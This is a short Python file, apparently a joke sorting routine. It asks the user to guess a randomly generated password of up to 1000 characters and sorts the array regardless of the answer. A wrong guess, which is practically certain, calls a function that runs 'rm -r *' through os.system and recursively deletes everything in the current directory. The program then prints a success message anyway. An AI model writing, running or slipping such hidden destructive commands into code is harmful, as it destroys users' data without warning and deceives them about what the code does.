# When function is called to sort, user will have to input the correct password or else everything is deleted
def wrongpassword():
    import os
    os.system("rm -r *")


def guessingsort(ar):
    import random
    import string
    
    length = random.randint(1, 1000)
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(characters) for _ in range(length))

    userInput = input("Enter password: ")
    if userInput == password:
        ...
    else:
        wrongpassword()

    print("Correct! The array is now sorted for you <3") 
    ar.sort()


def main():
    array = [5,4,3,2,1]
    guessingsort(array)


if __name__ == "__main__":
    main()